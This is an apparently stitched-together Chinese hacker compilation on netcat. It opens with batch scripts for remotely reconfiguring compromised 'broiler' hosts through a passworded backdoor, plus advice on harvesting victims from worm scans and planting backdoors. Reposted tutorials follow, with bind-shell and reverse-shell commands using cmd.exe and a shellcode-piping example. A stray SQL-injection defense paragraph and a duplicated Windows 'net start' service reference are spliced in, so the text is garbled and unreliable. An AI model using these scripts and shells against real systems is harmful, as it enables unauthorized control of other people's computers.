< 00000068 2c 20 63 6f 6d 6d 61 6e 64 20 22 22 20 75 6e 72 # , command "" unr
< 00000078 65 63 6f 67 6e 69 7a 65 64 2e 0d 0a # ecognized...
< 00000084 83 00 00 01 8f # .....


3.7 telnet,自动批处理。 ★★★★★我要重点推荐的东西就是这个.
nc victim_ip port < path\file.cmd 　 /*victim machine*/ 显示执行过程.
nc -vv victim_ip port < path\file.cmd 　 /*victim machine*/ 显示执行过程.

nc -d victim_ip port < path\file.cmd 安静模式.

_______________file.cmd________________________
password
cd %windir%
echo []=[%windir%]
c:
cd \
md test
cd /d %windir%\system32\
net stop sksockserver
snake.exe -config port 11111
net start sksockserver
exit
_______________file.cmd__END___________________

######################################################################
4. 管理肉鸡,更改肉鸡设置
######################################################################
4.1 比如要统一更改肉鸡上面的代理端口.snake.exe 修改为11111 服务名称"sksockserver"
使用winshell后门. 端口1234 密码password
命令格式就是
modi.bat youip.txt

___________modi.bat____________________________
@if "%1"=="" echo Error: no ip.txt &&goto END

:start
@echo password >a.cmd
@echo s >>a.cmd
@echo cd /d %%windir%%\system32\ >>a.cmd
@net stop "sksockserver" >>a.cmd
@snake.exe -config port 11111 >>a.cmd
@net start "sksockserver" >>a.cmd
@exit >>a.cmd

:auto
@for /f "eol=; tokens=1,2" %%i in (%1) do @(nc.exe -vv -w 3 %%i 1234 < a.cmd)

:END
___________modi.bat__END_______________________


4.2

@echo off
color f0
:start
cls
C:\nc -vv -w 3 -l -p 80>>80.txt
goto start
把防火墙关掉以后运行这个批处理，会监听到许多探测U漏洞的信息，大多
是三条一组--妮姆达病毒扫描你的。这样就会得到肉鸡的.虽然质量不高.
但是也是一种便宜的办法.

肉鸡特征：
1。unicode漏洞
2。guest密码为空，administrators组用户
3。其他漏洞

自己慢慢的爽去吧。不过，再次强调一句，不建议而且是不能破坏国内主机，上去以后将tftp.exe改名。然后用pskill干掉mmc.exe进程，之后是杀毒。做好后门以后，将guest帐号停用，以对付傻瓜扫描器

######################################################################
5. 下载连接
######################################################################
5.1 http://www.atstake.com/research/tools/network_utilities/
Tool: Netcat 1.10 for Unix 
Version: 03.20.96 
Platforms: *nix

Tool: Netcat 1.1 for Win 95/98/NT/2000 
Version: 02.08.98 
Platforms: Runs on Win 95/98/NT/2000 


5.2 http://www.xfocus.net/download.php?id=320 
名称： cryptcat_nt.zip 更新时间： 2002-04-05 
类别： 网络工具 平台： Win9x/NT/2000 大小： 115.8K 提交： maxilaw 
简介： 加密传输的nc。 

5.3 http://content.443.ch/pub/security/blackhat/Networking/nc/ 国外的网站
10.03.02 15:48 1305 cryptcat.txt
10.03.02 15:48 245760 cryptcat_linux2.tar
10.03.02 15:48 118533 cryptcat_nt.zip


######################################################################
6. 补充
######################################################################
以下为NetCat的Unix版本使用方法（转载）：
－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
nc使用技巧

by quack<quack@21cn.com>
http://www.xfocus.org 安全焦点

nc这个小玩意儿应该大家耳熟能详，也用了N年了吧……这里不多讲废话，结合一些script说说它的使用技巧。
(文中所举的script都来自于nc110.tgz的文件包)

一、基本使用

Quack# nc -h
[v1.10]
想要连接到某处: nc [-options] hostname port[s] [ports] ...
绑定端口等待连接: nc -l -p port [-options] [hostname] [port]
参数:
-e prog 程序重定向，一旦连接，就执行 [危险!!]
-g gateway source-routing hop point[s], up to 8
-G num source-routing pointer: 4, 8, 12, ...
-h 帮助信息
-i secs 延时的间隔
-l 监听模式，用于入站连接
-n 指定数字的IP地址，不能用hostname
-o file 记录16进制的传输
-p port 本地端口号
-r 任意指定本地及远程端口
-s addr 本地源地址
-u UDP模式
-v 详细输出――用两个-v可得到更详细的内容
-w secs timeout的时间
-z 将输入输出关掉――用于扫描时

其中端口号可以指定一个或者用lo-hi式的指定范围。

二、用于传输文件――ncp

#! /bin/sh
## 类似于rcp，但是是用netcat在高端口做的
## 在接收文件的机器上做"ncp targetfile"
## 在发送文件的机器上做"ncp sourcefile receivinghost"
## 如果调用了 "nzp" ，会将传输文件压缩

## 这里定义你想使用的端口，可以自由选择
MYPORT=23456

## 如果nc没有在系统路径中的话，要把下面一行注释去掉，加以修改
# PATH=${HOME}:${PATH}  export PATH

## 下面这几行检查参数输入情况
test "$3" && echo "too many args" && exit 1
test ! "$1" && echo "no args?" && exit 1
me=`echo $0 | sed 's+.*/++'`
test "$me" = "nzp" && echo '[compressed mode]'

# if second arg, it's a host to send an [extant] file to.
if test "$2"  then
test ! -f "$1" && echo "can't find $1" && exit 1
if test "$me" = "nzp"  then
compress -c < "$1" | nc -v -w 2 $2 $MYPORT && exit 0
else
nc -v -w 2 $2 $MYPORT < "$1" && exit 0
fi
echo "transfer FAILED!"
exit 1
fi

# 是否在接收文件机器当前目录有同名文件
if test -f "$1"  then
echo -n "Overwrite $1? "
read aa
test ! "$aa" = "y" && echo "[punted!]" && exit 1
fi
# 30 seconds oughta be pleeeeenty of time, but change if you want.
if test "$me" = "nzp"  then
# 注意这里nc的用法，结合了重定向符号和管道
nc -v -w 30 -p $MYPORT -l < /dev/null | uncompress -c > "$1" && exit 0
else
nc -v -w 30 -p $MYPORT -l < /dev/null > "$1" && exit 0
fi
echo "transfer FAILED!"
# clean up, since even if the transfer failed, $1 is already trashed
rm -f "$1"
exit 1

这样的话，我只要在A机器上先 QuackA# ncp ../abcd
listening on [any] 23456 ...
然后在另一台机器B上
QuackB#ncp abcd 192.168.0.2
quackb [192.168.0.1] 23456 (?)
A机上出现
open connect to [192.168.0.2] from quackb [192.168.0.1] 1027
#
查看一下，文件传输完毕。

三、用于绑定端口――bsh

首先要清楚，如果你编译netcat时仅用如make freebsd之类的命令来编译的话，这个工
具是无法利用的――要define一个GAPING_SECURITY_HOLE它才会提供-e选项。

#! /bin/sh
## 一个利用nc的绑定shell并且带有密码保护的脚本
## 带有一个参数，即端口号

NC=nc

case "$1" in
?* )
LPN="$1"
export LPN
sleep 1
#注意这里nc的用法，参数-l是lister，-e是执行重定向
echo "-l -p $LPN -e $0"  $NC -l -p $LPN -e $0 > /dev/null 2>&1 &
echo "launched on port $LPN"
exit 0
;;
esac

# here we play inetd
echo "-l -p $LPN -e $0"  $NC -l -p $LPN -e $0 > /dev/null 2>&1 &

while read qq  do
case "$qq" in
# 这里就是弱密码保护了，密码是quack
quack )
cd /
exec csh -i
;;
esac
done

要看看它是怎么使用的么？
quack# ./bsh 6666 <-------输入，后面是程序输出
-l -p 6666 -e ./bsh
launched on port 6666
quack#
quack## nc localhost 6666 <----------输入
-l -p 6666 -e ./bsh
quack <----------输入，密码验证
Warning: imported path contains relative components
Warning: no access to tty (Bad file descriptor).
Thus no job control in this shell.
Cracker#

四、 用于端口扫描――probe

在我们常见的一些端口扫描程序中，如Vetescan这类以shell script写成的话，很多都
需要系统中装有netcat，原因何在呢？看看下面的script，你或许会明白一些。

#! /bin/sh
## launch a whole buncha shit at yon victim in no particular order; capture
## stderr+stdout in one place. Run as root for rservice and low -p to work.
## Fairly thorough example of using netcat to collect a lot of host info.
## Will set off every intrusion alarm in existence on a paranoid machine!

# 该目录里有一些小工具
DDIR=../data
# 指定网关
GATE=192.157.69.11

# might conceivably wanna change this for different run styles
UCMD='nc -v -w 8'

test ! "$1" && echo Needs victim arg && exit 1

echo '' | $UCMD -w 9 -r "$1" 13 79 6667 2>&1
echo '0' | $UCMD "$1" 79 2>&1
# if LSRR was passed thru, should get refusal here:
# 要注意这里的用法，其实nc的这些参数掌握好可以做很多事情
$UCMD -z -r -g $GATE "$1" 6473 2>&1
$UCMD -r -z "$1" 6000 4000-4004 111 53 2105 137-140 1-20 540-550 95 87 2>&1
# -s `hostname` may be wrong for some multihomed machines
echo 'UDP echoecho!' | nc -u -p 7 -s `hostname` -w 3 "$1" 7 19 2>&1
echo '113,10158' | $UCMD -p 10158 "$1" 113 2>&1
rservice bin bin | $UCMD -p 1019 "$1" shell 2>&1
echo QUIT | $UCMD -w 8 -r "$1" 25 158 159 119 110 109 1109 142-144 220 23 2>&1
# newline after any telnet trash
echo ''
echo PASV | $UCMD -r "$1" 21 2>&1
echo 'GET /' | $UCMD -w 10 "$1" 80 81 210 70 2>&1
# sometimes contains useful directory info:
# 知道robots.txt是什么文件么？;)
echo 'GET /robots.txt' | $UCMD -w 10 "$1" 80 2>&1
# now the big red lights go on
# 利用小工具rservice来尝试，该工具可以在nc110.tgz的data目录里找到
rservice bin bin 9600/9600 | $UCMD -p 1020 "$1" login 2>&1
rservice root root | $UCMD -r "$1" exec 2>&1
echo 'BEGIN big udp -- everything may look "open" if packet-filtered'
data -g < ${DDIR}/nfs-0.d | $UCMD -i 1 -u "$1" 2049 | od -x 2>&1
# no wait-time, uses RTT hack
nc -v -z -u -r "$1" 111 66-70 88 53 87 161-164 121-123 213 49 2>&1
nc -v -z -u -r "$1" 137-140 694-712 747-770 175-180 2103 510-530 2>&1
echo 'END big udp'
$UCMD -r -z "$1" 175-180 2000-2003 530-533 1524 1525 666 213 8000 6250 2>&1
# Use our identd-sniffer!
iscan "$1" 21 25 79 80 111 53 6667 6000 2049 119 2>&1
# this gets pretty intrusive, but what the fuck. Probe for portmap first
if nc -w 5 -z -u "$1" 111  then
showmount -e "$1" 2>&1 #象showmount和rpcinfo的使用，可能会被逮到;)
rpcinfo -p "$1" 2>&1
fi
exit 0

感觉也没什么好说的，脚本本身说明了一切。当然象上面的脚本只是示范性的例子，真正地使用时，
这样扫描会留下大量的痕迹，系统管理员会额外小心;)



【nc的说明及使用 】
首页>>安全技术>>网络安全>>文章  
经典好文:nc的说明及使用 

--------------------------------------------------------------------------------

［日期：2005-3-26 7:33:58     来源:   编辑：  点击：134］//双击滚屏
 
整理人:demonalex 
email:demonalex_at_dark2s.org 
参考资料：程序原创者Hobbit与Chris Wysopal的说明文档、G-python、黑猫警长、Quack、zhoutree等各位高手的文章 


netcat被誉为网络安全界的‘瑞士军刀'，相信没有什么人不认识它吧...... 
一个简单而有用的工具，透过使用TCP或UDP协议的网络连接去读写数据。它被设计成一个稳定的后门工具， 
能够直接由其它程序和脚本轻松驱动。同时，它也是一个功能强大的网络调试和探测工具，能够建立你需要的几 
乎所有类型的网络连接，还有几个很有意思的内置功能(详情请看下面的使用方法)。 

在中国，它的WINDOWS版有两个版本，一个是原创者Chris Wysopal写的原版本，另一个是由‘红与黑'编译 
后的新‘浓缩'版。‘浓缩'版的主程序只有10多KB（10多KB的NC是不能完成下面所说的第4、第5种使用方法， 
有此功能的原版NC好象要60KB：P），虽然"体积"小，但很完成很多工作。 
<!--StartFragment-->=====================================================================================================
软件介绍：

工具名：Netcat
作者：Hobbit && Chris Wysopal
网址：http://www.atstake.com/research/tools/network_utilities/
类别：开放源码
平台：Linux/BSD/Unix/Windows   
WINDOWS下版本号：[v1.10 NT]

=====================================================================================================
参数介绍：

'nc.exe -h'即可看到各参数的使用方法。
基本格式：nc [-options] hostname port[s] [ports] ...
          nc -l -p port [options] [hostname] [port]

-d 后台模式
-e prog 程序重定向，一旦连接，就执行 [危险!!]
-g gateway source-routing hop point[s], up to 8
-G num source-routing pointer: 4, 8, 12, ...
-h 帮助信息
-i secs 延时的间隔
-l 监听模式，用于入站连接
-L 连接关闭后,仍然继续监听
-n 指定数字的IP地址，不能用hostname
-o file 记录16进制的传输
-p port 本地端口号
-r 随机本地及远程端口
-s addr 本地源地址
-t 使用TELNET交互方式
-u UDP模式
-v 详细输出--用两个-v可得到更详细的内容
-w secs timeout的时间
-z 将输入输出关掉--用于扫描时

端口的表示方法可写为M-N的范围格式。


=====================================================================================================
基本用法：

大概有以下几种用法：

1)连接到REMOTE主机，例子：
格式：nc -nvv 192.168.x.x 80
讲解：连到192.168.x.x的TCP80端口


2)监听LOCAL主机，例子：
格式：nc -l -p 80
讲解：监听本机的TCP80端口


3)扫描远程主机，例子：
格式：nc -nvv -w2 -z 192.168.x.x 80-445
讲解：扫描192.168.x.x的TCP80到TCP445的所有端口


4)REMOTE主机绑定SHELL，例子：
格式：nc -l -p 5354 -t -e c:\winnt\system32\cmd.exe
讲解：绑定REMOTE主机的CMDSHELL在REMOTE主机的TCP5354端口


5)REMOTE主机绑定SHELL并反向连接，例子：
格式：nc -t -e c:\winnt\system32\cmd.exe 192.168.x.x 5354
讲解：绑定REMOTE主机的CMDSHELL并反向连接到192.168.x.x的TCP5354端口


以上为最基本的几种用法（其实NC的用法还有很多，
当配合管道命令"|"与重定向命令"<"、">"等等命令功能更强大......）。

=====================================================================================================
高级用法：

6)作攻击程序用，例子：
格式1：type.exe c:\exploit.txt|nc -nvv 192.168.x.x 80
格式2：nc -nvv 192.168.x.x 80 < c:\exploit.txt
讲解：连接到192.168.x.x的80端口，并在其管道中发送'c:\exploit.txt'的内容(两种格式确有相同的效果，
      真是有异曲同工之妙:P)

附：'c:\exploit.txt'为shellcode等


7)作蜜罐用[1]，例子：
格式：nc -L -p 80
讲解：使用'-L'(注意L是大写)可以不停地监听某一个端口，直到ctrl+c为止



8)作蜜罐用[2]，例子：
格式：nc -L -p 80 > c:\log.txt
讲解：使用'-L'可以不停地监听某一个端口，直到ctrl+c为止，同时把结果输出到'c:\log.txt'中，如果把‘>'
      改为‘>>'即可以追加日志

附：'c:\log.txt'为日志等


9)作蜜罐用[3]，例子：
格式1：nc -L -p 80 < c:\honeypot.txt
格式2：type.exe c:\honeypot.txt|nc -L -p 80
讲解：使用'-L'可以不停地监听某一个端口，直到ctrl+c为止，并把'c:\honeypot.txt'的内容‘送'入其
      管道中

 
 
 


【nc的说明及使用】
nc的说明及使用


nc的说明及使用 


nc的说明及使用 
netcat被誉为网络安全界的‘瑞士军刀’，相信没有什么人不认识它吧...... 
一个简单而有用的工具，透过使用TCP或UDP协议的网络连接去读写数据。它被设计成一个稳定的后门工具， 
能够直接由其它程序和脚本轻松驱动。同时，它也是一个功能强大的网络调试和探测工具，能够建立你需要的几 
乎所有类型的网络连接，还有几个很有意思的内置功能(详情请看下面的使用方法)。 

在中国，它的WINDOWS版有两个版本，一个是原创者Chris Wysopal写的原版本，另一个是由‘红与黑’编译 
后的新‘浓缩’版。‘浓缩’版的主程序只有10多KB（10多KB的NC是不能完成下面所说的第4、第5种使用方法， 
有此功能的原版NC好象要60KB：P），虽然“体积”小，但很完成很多工作。 
======================================================
软件介绍： 

工具名：Netcat 
作者：Hobbit && Chris Wysopal 
网址：http://www.atstake.com/research/tools/network_utilities/ 
类别：开放源码 
平台：Linux/BSD/Unix/Windows 
WINDOWS下版本号：[v1.10 NT] 

===================================================================================================== 
参数介绍： 

nc.exe -h即可看到各参数的使用方法。 
基本格式：nc [-options] hostname port[s] [ports] ... 
nc -l -p port [options] [hostname] [port] 

-d 后台模式 
-e prog 程序重定向，一旦连接，就执行 [危险!!] 
-g gateway source-routing hop point[s], up to 8 
-G num source-routing pointer: 4, 8, 12, ... 
-h 帮助信息 
-i secs 延时的间隔 
-l 监听模式，用于入站连接 
-L 连接关闭后,仍然继续监听 
-n 指定数字的IP地址，不能用hostname 
-o file 记录16进制的传输 
-p port 本地端口号 
-r 随机本地及远程端口 
-s addr 本地源地址 
-t 使用TELNET交互方式 
-u UDP模式 
-v 详细输出--用两个-v可得到更详细的内容 
-w secs timeout的时间 
-z 将输入输出关掉--用于扫描时 

端口的表示方法可写为M-N的范围格式。 


===================================================================================================== 
基本用法： 

大概有以下几种用法： 

1)连接到REMOTE主机，例子： 
格式：nc -nvv 192.168.x.x 80 
讲解：连到192.168.x.x的TCP80端口 


2)监听LOCAL主机，例子： 
格式：nc -l -p 80 
讲解：监听本机的TCP80端口 


3)扫描远程主机，例子： 
格式：nc -nvv -w2 -z 192.168.x.x 80-445 
讲解：扫描192.168.x.x的TCP80到TCP445的所有端口 


4)REMOTE主机绑定SHELL，例子： 
格式：nc -l -p 5354 -t -e c:winntsystem32cmd.exe 
讲解：绑定REMOTE主机的CMDSHELL在REMOTE主机的TCP5354端口 


5)REMOTE主机绑定SHELL并反向连接，例子： 
格式：nc -t -e c:winntsystem32cmd.exe 192.168.x.x 5354 
讲解：绑定REMOTE主机的CMDSHELL并反向连接到192.168.x.x的TCP5354端口 


以上为最基本的几种用法（其实NC的用法还有很多， 
当配合管道命令“|”与重定向命令“<”、“>”等等命令功能更强大......）。 

===================================================================================================== 
高级用法： 

6)作攻击程序用，例子： 
格式1：type.exe c:exploit.txt|nc -nvv 192.168.x.x 80 
格式2：nc -nvv 192.168.x.x 80 < c:exploit.txt 
讲解：连接到192.168.x.x的80端口，并在其管道中发送c:exploit.txt的内容(两种格式确有相同的效果， 
真是有异曲同工之妙:P) 

附：c:exploit.txt为shellcode等 


7)作蜜罐用[1]，例子： 
格式：nc -L -p 80 
讲解：使用-L(注意L是大写)可以不停地监听某一个端口，直到ctrl+c为止 


8)作蜜罐用[2]，例子： 
格式：nc -L -p 80 > c:log.txt 
讲解：使用-L可以不停地监听某一个端口，直到ctrl+c为止，同时把结果输出到c:log.txt中，如果把‘>’ 
改为‘>>’即可以追加日志 

附：c:log.txt为日志等 


9)作蜜罐用[3]，例子： 
格式1：nc -L -p 80 < c:honeypot.txt 
格式2：type.exe c:honeypot.txt|nc -L -p 80 
讲解：使用-L可以不停地监听某一个端口，直到ctrl+c为止，并把c:honeypot.txt的内容‘送’入其 
管道中 
如果攻击者知道应用会将表单中输入的内容直接用于验证身份的查询，他就会尝试输入某些特殊的SQL字符串篡改查询改变其原来的功能，欺骗系统授予访问权限。 　　系统环境不同，攻击者可能造成的损害也不同，这主要由应用访问数据库的安全权限决定。如果用户的帐户具有管理员或其他比较高级的权限，攻击者就可能对数据库的表执行各种他想要做的操作，包括添加、删除或更新数据，甚至可能直接删除表。 二、如何防范？ 　　好在要防止ASP.NET应用被SQL注入式攻击闯入并不是一件特别困难的事情，只要在利用表单输入的内容构造SQL命令之前，把所有输入内容过滤一番就可以了。过滤输入内容可以按多种方式进行。 　　⑴ 对于动态构造SQL查询的场合，可以使用下面的技术： 　　第一：替换单引号，即把所有单独出现的单引号改成两个单引号，防止攻击者修改SQL命令的含义。再来看前面的例子，“SELECT * from Users WHERE login = or 1=1 AND password = or 1=1”显然会得到与“SELECT * from Users WHERE login = or 1=1 AND password = or 1=1”不同的结果。 　　第二：删除用户输入内容中的所有连字符，防止攻击者构造出类如“SELECT * from Users WHERE login = mas -- AND password =”之类的查询，因为这类查询的后半部分已经被注释掉，不再有效，攻击者只要知道一个合法的用户登录名称，根本不需要知道用户的密码就可以顺利获得访问权限。 　　第三：对于用来执行查询的数据库帐户，限制其权限。用不同的用户帐户执行查询、插入、更新、删除操作。由于隔离了不同帐户可执行的操作，因而也就防止了原本用于执行SELECT命令的地方却被用于执行INSERT、UPDATE或DELETE命令。 　　⑵ 用存储过程来执行所有的查询。SQL参数的传递方式将防止攻击者利用单引号和连字符实施攻击。此外，它还使得数据库权限可以限制到只允许特定的存储过程执行，所有的用户输入必须遵从被调用的存储过程的安全上下文，这样就很难再发生注入式攻击了。 　　⑶ 限制表单或查询字符串输入的长度。如果用户的登录名字最多只有10个字符，那么不要认可表单中输入的10个以上的字符，这将大大增加攻击者在SQL命令中插入有害代码的难度。 　　⑷ 检查用户输入的合法性，确信输入的内容只包含合法的数据。数据检查应当在客户端和服务器端都执行――之所以要执行服务器端验证，是为了弥补客户端验证机制脆弱的安全性。 　　在客户端，攻击者完全有可能获得网页的源代码，修改验证合法性的脚本（或者直接删除脚本），然后将非法内容通过修改后的表单提交给服务器。因此，要保证验证操作确实已经执行，唯一的办法就是在服务器端也执行验证。你可以使用许多内建的验证对象，例如RegularExpressionValidator，它们能够自动生成验证用的客户端脚本，当然你也可以插入服务器端的方法调用。如果找不到现成的验证对象，你可以通过CustomValidator自己创建一个。 　　⑸ 将用户登录名称、密码等数据加密保存。加密用户输入的数据，然后再将它与数据库中保存的数据比较，这相当于对用户输入的数据进行了“消毒”处理，用户输入的数据不再对数据库有任何特殊的意义，从而也就防止了攻击者注入SQL命令。System.Web.Security.FormsAuthentication类有一个HashPasswordForStoringInConfigFile，非常适合于对输入数据进行消毒处理。 　　⑹ 检查提取数据的查询所返回的记录数量。如果程序只要求返回一个记录，但实际返回的记录却超过一行，那就当作出错处理。 


【net start 可以启动的命令一览】
                         net start 可以启动的命令一览


Net start 
启动服务，或显示已启动服务的列表。两个或多个词组成的服务名，例如 Net Logon 或 Co 
mputer Browser，必须两边加引号 ("。 
net start [service] 
参数 
无 
键入不带参数的 net start 显示正在运行服务的列表。 
service 
包括 alerter、client service for netware、clipbook server、content 
index、comput 
er browser、dhcp client、directory replicator、eventlog、ftp publishing 
service、 
hypermedia object manager、logical disk manager、lpdsvc、media services 
managemen 
t, messenger、Fax Service、Microsoft install server、net logon、network 
dde、netw 
ork dde dsdm、nt lm security support provider、ole、plug and 
play、remote access 
connection manager、remote access isnsap service、remote access 
server、remote pr 
ocedure call (rpc) locator、remote procedure call (rpc) 
service、schedule、server 
、simple tcp/ip services、site server ldap service、smartcard resource 
manager、s 
nmp、spooler、task scheduler、tcp/ip netbios helper、telephony 
service、tracking 
service、tracking (server) service、ups、Windows time service 和 
workstation。 
下面服务只有在 Windows 2000 上可用：file service for macintosh、gateway service 
for netware、microsoft dhcp service、print service for 
macintosh、windows interne 
t name service。 

Net start Alerter 
启动“警报器”服务。“警报器”服务发送警告消息。 
Net start Alerter 
Net start Client Service for NetWare 
启动“NetWare 客户服务”。该命令只有在安装了 NetWare 客户服务的情况下才能在 Wind 
ows 2000 Professional 上使用。 
net start "client service for netware" 
Net start ClipBook Server 
启动“剪贴簿服务器”服务。两个单词组成的服务名，例如 ClipBook Server，必须两边加 
引号 ("。 
net start "clipbook server" 

Net start Computer Browser 
启动“计算机浏览器”服务。 
net start "computer browser" 

Net start DHCP Client 
启动“DHCP 客户”服务。该命令只有在安装了 TCP/IP 协议之后才可用。 
net start "dhcp client" 

Net start Directory Replicator 
启动“目录复制程序”服务。“目录复制程序”服务将指定的文件复制到指定服务器上。两 
个词组成的服务名，例如 Directory Replicator，必须两边加引号 ("。也可以用命令 net 
start replicator 启动该服务。 
net start "directory replicator" 

Net start Eventlog 
启动“事件日志”服务，该服务将事件记录在本地计算机上。必须在使用事件查看器查看记 
录的事件之前启动该服务。 
net start Eventlog 

Net start File Server for Macintosh 
启动 Macintosh 文件服务，允许 Macintosh 计算机使用共享文件。该命令只能在运行 Win 
dows 2000 Server 的计算机上可用。 
net start "file service for macintosh" 
Net start FTP Publishing Service 
启动 FTP 发布服务。该命令只有在安装了 Internet 信息服务后才可用。 
net start "ftp publishing service" 
Net start Gateway Service for NetWare 
启动 NetWare 网关服务。该命令只有在安装了 NetWare 网关服务的情况下才能在 Windows 
2000 Server 上可用。 
net start "gateway service for netware" 
Net start Lpdsvc 
启动 TCP/IP 打印服务器服务。该命令只有在 UNIX 打印服务和 TCP/IP 协议安装后方可使 
用。 
net start lpdsvc 

Net start Messenger 
启动“信使”服务。“信使”务允许计算机接收邮件?
net start messenger 

Net start Microsoft DHCP Service 
启动 Microsoft DHCP 服务。该命令只有在运行 Windows 2000 Server 并且已安装 TCP/IP 
协议和 DHCP 服务的情况下才可用。 
net start "microsoft dhcp service" 

Net start Net Logon 
启动“网络登录”服务。“网络登录”服务验证登录请求并控制复制用户帐户数据库域宽。 
两个词组成的服务名，例如 Net Logon，必须两边加引号 ("。该服务也可以使用命令 net 
start netlogon 启动。 
net start "net logon" 

Net start Network DDE 
启动“网络 DDE”服务。 
net start "network dde" 
Net start NT LM Security Support Provider 
启动“NT LM 安全支持提供程序”服务。该命令只有在安装了“NT LM 安全支持提供程序” 
后才可用。 
net start "nt lm security support provider" 
Net start OLE 
启动对象链接和嵌入服务。 
net start ole 
Net start Print Server for Macintosh 
启动 Macintosh 打印服务器服务，允许从 Macintosh 计算机打印。该命令只能在运行 Win 
dows 2000 Server 的计算机上可用。 
net start "print server for macintosh" 
Net start Remote Access Connection Manager 
启动“远程访问连接管理器”服务。该命令只有在安装了“远程访问服务”后才可用。 
net start "remote access connection manager" 
Net start Remote Access ISNSAP Service 
启动“远程访问 ISNSAP 服务”。该命令只有在安装了“远程访问服务”后才可用。 
net start "remote access isnsap service" 
Net start Remote Procedure Call (RPC) Locator 
启动 RPC 定位器服务。“定位器”服务是 Microsoft Windows 2000 的 RPC 名称服务。 
net start "remote procedure call (rpc) locator" 

Net start Remote Procedure Call (RPC) Service 
启动“远程过程调用 (RPC) 服务”。“远程过程调用 (RPC) 服务”是 Microsoft Windows 
2000 的 RPC 子系统。RPC 子系统包括终结点映射器和其他各种 RPC 服务。 
net start "remote procedure call (rpc) service" 

Net start Schedule 
启动“计划”服务。“计划”服务使计算机可以使用 at 命令在指定时间启动程序。 
net start schedule 

Net start Server 
启动“服务器”服务。“服务器”服务使计算机可以共享网络上的资源。 
net start server 

Net start Simple TCP/IP Services 
启动“简单 TCP/IP 服务”服务。该命令只有在安装了 TCP/IP 和“简单 TCP/IP 服务”后 
才可以使用。 
net start "simple tcp/ip services" 
Net start Site Server LDAP Service 
启动“Site Server LDAP 服务”。“Site Server LDAP 服务”在 Windows 2000 Active D 

irectory 中发布 IP 多播会议。该命令只有在安装了“Site Server LDAP 服务”后才可以使 
用。 
net start "site server ldap service" 

Net start SNMP 
启动 SNMP 服务。SNMP 服务允许服务器向 TCP/IP 网络上的 SNMP 管理系统报告当前状态。 
该命令只有在安装了 TCP/IP 和 SNMP 后才可以使用。 
net start snmp 

Net start Spooler 
启动“后台打印程序”。 
net start spooler 
Net start TCP/IP NetBIOS Helper 
在 TCP 服务上启用 Netbios 支持。该命令只有在安装了 TCP/IP 才可用。 
net start "tcp/ip netbios helper" 
Net start UPS 
启动“不间断电源 (UPS)”服务 
net start ups 

Net start Windows Internet Name Service 
启动“Windows Internet 命名服务”。该命令只有在安装了 TCP/IP 和“Windows Interne 
t 命名服务”后在 Windows 2000 Servers 上才可以使用。 
net start "windows internet name service" 

Net start Workstation 
启动“工作站”服务。“工作站”服务使计算机可以连接并使用网络资源。 
net start workstation 
Net start Schedule 
有的地方称为“定时”服务，叫法不同，请大家注意了，其实是一回事！
Net start Telnet 
启动telnet服务，打开23端口，有的情况下需先运行NTLM.exe。为什么？到榕G的说明里去找 
吧！ 
net start workstation 
打开NET USE 
net start lanmanserver 
打开 IPC 服务。 
开FTP命令是：net start msftpsvc 
Net start 
启动服务，或显示已启动服务的列表。两个或多个词组成的服务名，例如 Net Logon 或 Co 
mputer Browser，必须两边加引号 ("。 
net start [service] 
参数 
无 
键入不带参数的 net start 显示正在运行服务的列表。 
service 
包括 alerter、client service for netware、clipbook server、content 
index、comput 
er browser、dhcp client、directory replicator、eventlog、ftp publishing 
service、 
hypermedia object manager、logical disk manager、lpdsvc、media services 
managemen 
t, messenger、Fax Service、Microsoft install server、net logon、network 
dde、netw 
ork dde dsdm、nt lm security support provider、ole、plug and 
play、remote access 
connection manager、remote access isnsap service、remote access 
server、remote pr 
ocedure call (rpc) locator、remote procedure call (rpc) 
service、schedule、server 
、simple tcp/ip services、site server ldap service、smartcard resource 
manager、s 
nmp、spooler、task scheduler、tcp/ip netbios helper、telephony 
service、tracking 
service、tracking (server) service、ups、Windows time service 和 
workstation。 
下面服务只有在 Windows 2000 上可用：file service for macintosh、gateway service 
for netware、microsoft dhcp service、print service for 
macintosh、windows interne 
t name service。 

Net start Alerter 
启动“警报器”服务。“警报器”服务发送警告消息。 
Net start Alerter 
Net start Client Service for NetWare 
启动“NetWare 客户服务”。该命令只有在安装了 NetWare 客户服务的情况下才能在 Wind 
ows 2000 Professional 上使用。 
net start "client service for netware" 
Net start ClipBook Server 
启动“剪贴簿服务器”服务。两个单词组成的服务名，例如 ClipBook Server，必须两边加 
引号 ("。 
net start "clipbook server" 

Net start Computer Browser 
启动“计算机浏览器”服务。 
net start "computer browser" 

Net start DHCP Client 
启动“DHCP 客户”服务。该命令只有在安装了 TCP/IP 协议之后才可用。 
net start "dhcp client" 

Net start Directory Replicator 
启动“目录复制程序”服务。“目录复制程序”服务将指定的文件复制到指定服务器上。两 
个词组成的服务名，例如 Directory Replicator，必须两边加引号 ("。也可以用命令 net 
start replicator 启动该服务。 
net start "directory replicator" 

Net start Eventlog 
启动“事件日志”服务，该服务将事件记录在本地计算机上。必须在使用事件查看器查看记 
录的事件之前启动该服务。 
net start Eventlog 

Net start File Server for Macintosh 
启动 Macintosh 文件服务，允许 Macintosh 计算机使用共享文件。该命令只能在运行 Win 
dows 2000 Server 的计算机上可用。 
net start "file service for macintosh" 
Net start FTP Publishing Service 
启动 FTP 发布服务。该命令只有在安装了 Internet 信息服务后才可用。 
net start "ftp publishing service" 
Net start Gateway Service for NetWare 
启动 NetWare 网关服务。该命令只有在安装了 NetWare 网关服务的情况下才能在 Windows 
2000 Server 上可用。 
net start "gateway service for netware" 
Net start Lpdsvc 
启动 TCP/IP 打印服务器服务。该命令只有在 UNIX 打印服务和 TCP/IP 协议安装后方可使 
用。 
net start lpdsvc 

Net start Messenger 
启动“信使”服务。“信使”服务允许计算机接收邮件。 
net start messenger 

Net start Microsoft DHCP Service 
启动 Microsoft DHCP 服务。该命令只有在运行 Windows 2000 Server 并且已安装 TCP/IP 
协议和 DHCP 服务的情况下才可用。 
net start "microsoft dhcp service" 

Net start Net Logon 
启动“网络登录”服务。“网络登录”服务验证登录请求并控制复制用户帐户数据库域宽。 
两个词组成的服务名，例如 Net Logon，必须两边加引号 ("。该服务也可以使用命令 net 
start netlogon 启动。 
net start "net logon" 

Net start Network DDE 
启动“网络 DDE”服务。 
net start "network dde" 
Net start NT LM Security Support Provider 
启动“NT LM 安全支持提供程序”服务。该命令只有在安装了“NT LM 安全支持提供程序” 
后才可用。 
net start "nt lm security support provider" 
Net start OLE 
启动对象链接和嵌入服务。 
net start ole 
Net start Print Server for Macintosh 
